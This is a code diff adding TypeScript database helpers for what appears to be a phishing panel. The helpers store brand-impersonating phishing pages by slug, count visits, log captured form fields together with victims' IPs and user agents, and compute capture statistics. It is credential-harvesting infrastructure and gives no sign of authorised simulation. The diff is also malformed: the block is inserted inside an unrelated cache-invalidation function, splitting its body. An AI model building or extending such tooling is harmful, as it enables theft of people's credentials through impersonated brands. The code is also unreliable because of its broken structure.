@@ -701,6 +701,158 @@ export const dbHelpers = {
   },
 
   invalidateDeviceSecretsCache(): void {
+// --- Phishing ----------------------------------------------------------
+
+  getPhishingPageBySlug(slug: string): typeof schema.phishingPages.$inferSelect | undefined {
+    const d = getDb();
+    return d.select().from(phishingPages).where(eq(phishingPages.slug, slug)).get();
+  },
+
+  listPhishingPages(opts: { page?: number; pageSize?: number; search?: string; category?: string; enabled?: boolean | null } = {}): Array<{
+    id: number; slug: string; brand: string; category: string; variant: string; title: string;
+    hits: number; enabled: number; createdAt: string | null;
+  }> {
+    const d = getDb();
+    const page = Math.max(1, opts.page ?? 1);
+    const pageSize = Math.min(100, Math.max(1, opts.pageSize ?? 20));
+    const conditions = [];
+    if (opts.search) {
+      const pattern = `%${opts.search}%`;
+      conditions.push(or(like(phishingPages.brand, pattern), like(phishingPages.slug, pattern)));
+    }
+    if (opts.category) conditions.push(eq(phishingPages.category, opts.category));
+    if (typeof opts.enabled === 'boolean') conditions.push(eq(phishingPages.enabled, opts.enabled ? 1 : 0));
+    return d.select({
+      id: phishingPages.id,
+      slug: phishingPages.slug,
+      brand: phishingPages.brand,
+      category: phishingPages.category,
+      variant: phishingPages.variant,
+      title: phishingPages.title,
+      hits: phishingPages.hits,
+      enabled: phishingPages.enabled,
+      createdAt: phishingPages.createdAt,
+    }).from(phishingPages).where(and(...conditions))
+      .orderBy(desc(phishingPages.createdAt))
+      .limit(pageSize)
+      .offset((page - 1) * pageSize)
+      .all();
+  },
+
+  countPhishingPages(opts: { search?: string; category?: string; enabled?: boolean | null } = {}): number {
+    const d = getDb();
+    const conditions = [];
+    if (opts.search) {
+      const pattern = `%${opts.search}%`;
+      conditions.push(or(like(phishingPages.brand, pattern), like(phishingPages.slug, pattern)));
+    }
+    if (opts.category) conditions.push(eq(phishingPages.category, opts.category));
+    if (typeof opts.enabled === 'boolean') conditions.push(eq(phishingPages.enabled, opts.enabled ? 1 : 0));
+    const row = d.select({ count: count() }).from(phishingPages).where(and(...conditions)).get();
+    return row?.count ?? 0;
+  },
+
+  savePhishingPage(data: { slug: string; brand: string; category: string; variant: string; title: string; html: string; createdBy?: string | null }): void {
+    const d = getDb();
+    d.insert(phishingPages).values({
+      slug: data.slug,
+      brand: data.brand,
+      category: data.category,
+      variant: data.variant,
+      title: data.title,
+      html: data.html,
+      createdBy: data.createdBy ?? null,
+    }).onConflictDoUpdate({
+      target: phishingPages.slug,
+      set: {
+        brand: data.brand,
+        category: data.category,
+        variant: data.variant,
+        title: data.title,
+        html: data.html,
+        createdBy: data.createdBy ?? null,
+      },
+    }).run();
+  },
+
+  deletePhishingPage(id: number): boolean {
+    const d = getDb();
+    const result = d.delete(phishingPages).where(eq(phishingPages.id, id)).run();
+    return result.changes > 0;
+  },
+
+  setPhishingPageEnabled(id: number, enabled: boolean): boolean {
+    const d = getDb();
+    const result = d.update(phishingPages).set({ enabled: enabled ? 1 : 0 }).where(eq(phishingPages.id, id)).run();
+    return result.changes > 0;
+  },
+
+  incrementPhishingHit(id: number): void {
+    const d = getDb();
+    d.update(phishingPages).set({ hits: sql`${phishingPages.hits} + 1` }).where(eq(phishingPages.id, id)).run();
+  },
+
+  logPhishingCapture(pageId: number | null, slug: string, brand: string, variant: string, ip: string, userAgent: string, fields: string, meta: string): void {
+    const d = getDb();
+    d.insert(phishingLogs).values({ pageId, slug, brand, variant, ip, userAgent, fields, meta }).run();
+  },
+
+  listPhishingLogs(opts: { page?: number; pageSize?: number; slug?: string; search?: string } = {}): Array<typeof schema.phishingLogs.$inferSelect> {
+    const d = getDb();
+    const page = Math.max(1, opts.page ?? 1);
+    const pageSize = Math.min(100, Math.max(1, opts.pageSize ?? 20));
+    const conditions = [];
+    if (opts.slug) conditions.push(eq(phishingLogs.slug, opts.slug));
+    if (opts.search) {
+      const pattern = `%${opts.search}%`;
+      conditions.push(or(like(phishingLogs.brand, pattern), like(phishingLogs.ip, pattern)));
+    }
+    return d.select().from(phishingLogs).where(and(...conditions))
+      .orderBy(desc(phishingLogs.createdAt))
+      .limit(pageSize)
+      .offset((page - 1) * pageSize)
+      .all();
+  },
+
+  countPhishingLogs(opts: { slug?: string; search?: string } = {}): number {
+    const d = getDb();
+    const conditions = [];
+    if (opts.slug) conditions.push(eq(phishingLogs.slug, opts.slug));
+    if (opts.search) {
+      const pattern = `%${opts.search}%`;
+      conditions.push(or(like(phishingLogs.brand, pattern), like(phishingLogs.ip, pattern)));
+    }
+    const row = d.select({ count: count() }).from(phishingLogs).where(and(...conditions)).get();
+    return row?.count ?? 0;
+  },
+
+  clearPhishingLogs(): number {
+    const d = getDb();
+    const result = d.delete(phishingLogs).run();
+    return result.changes;
+  },
+
+  getPhishingStats() {
+    const d = getDb();
+    const totalPages = d.select({ count: count() }).from(phishingPages).get()?.count ?? 0;
+    const enabledPages = d.select({ count: count() }).from(phishingPages).where(eq(phishingPages.enabled, 1)).get()?.count ?? 0;
+    const totalHits = d.select({ sum: sql<number>`COALESCE(SUM(${phishingPages.hits}), 0)` }).from(phishingPages).get()?.sum ?? 0;
+    const totalCaptures = d.select({ count: count() }).from(phishingLogs).get()?.count ?? 0;
+    const cutoff = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString().replace('T', ' ').slice(0, 19);
+    const capturesToday = d.select({ count: count() }).from(phishingLogs).where(gt(phishingLogs.createdAt, cutoff)).get()?.count ?? 0;
+    const topPages = d.select({
+      pageId: phishingLogs.pageId,
+      slug: phishingLogs.slug,
+      brand: phishingLogs.brand,
+      variant: phishingLogs.variant,
+      captures: count(),
+    }).from(phishingLogs).groupBy(phishingLogs.slug).orderBy(desc(count())).limit(10).all();
+    const byCategory = d.select({
+      category: phishingPages.category,
+      count: count(),
+    }).from(phishingPages).groupBy(phishingPages.category).orderBy(desc(count())).all();
+    return { totalPages, enabledPages, totalHits, totalCaptures, capturesToday, topPages, byCategory };
+  },
     deviceSecretsCache = null;
   },
 };
